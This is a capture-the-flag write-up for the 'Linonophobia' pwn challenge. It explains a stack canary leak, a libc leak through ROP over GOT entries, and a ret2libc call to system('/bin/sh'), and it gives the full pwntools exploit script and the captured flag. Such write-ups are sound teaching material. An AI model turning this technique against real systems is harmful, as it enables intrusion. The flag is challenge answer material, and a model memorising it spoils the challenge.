# Linonophobia

## Task

[Linonophobia](https://imaginaryctf.org/r/2021-linonophobia)

## Solution

We open the binary and immediatly see two vulnerabilities: 
The first one is just a bufferoverflow (We read up to 512
bytes but the buffer is just 264 bytes or something)
The second one turns out to be a fake vulnerability, because
we do a printf with user input data, but actually we overwrite
the printf with puts before we do anything. So we just have the
buffer overflow to work with.

But first we need to leak the canary. We can do that by just 
filling the buffer until the end, then the canary will be printed
because there's no null terminator anymore.

Next we need to leak the libc to get something useful,
so I ropped `puts(&puts)` and `puts(&read)` to get the libc I need
and then did a return to main to send a second payload in which
I know the base address of libc, which means I can just do a
system("bin/sh") with rop.

Pretty classic I'd say.


```python
io = start()

io.recvline()
payload = b"A"*265
io.send(payload)
with_canary = b"\x00"+io.recvline()[-8:]
canary = with_canary[:-1]
log.info("Got canary: %x", u64(canary))

payload = payload[:-1]
payload += canary
payload += p64(0x0) # rbp
payload += p64(0x400873) # pop rdi
payload += p64(0x600fe8) # puts at got
payload += p64(0x4005c0) # puts()  

payload += p64(0x400873) # pop rdi
payload += p64(0x601028) # read at got.plt
payload += p64(0x4005c0) # puts() 

payload += p64(0x4006b7) # main

io.sendline(payload)


puts = u64(io.recvline()[:-1].ljust(8,b'\x00'))
read = u64(io.recvline()[:-1].ljust(8,b'\x00'))

libc_base = puts-0x875a0
system = libc_base+0x55410
binsh = libc_base+0x1b75aa

log.info("puts @ %x, read @ %x", puts, read)

payload = b"A"*264
payload += canary
payload += p64(0)
payload += p64(0x400873) # pop rdi
payload += p64(binsh) # puts at got
payload += p64(system) # puts()  # could also be at 406030
io.sendline(payload)

io.interactive()
```

I had to adjust some offsets at one point because they deployed
a new version, but the general idea was the same, they just changed
something with the got/plt I think.

And now just cat the flag.txt:

`ictf{str1ngs_4r3_null_t3rm1n4t3d!_b421ba9f}`


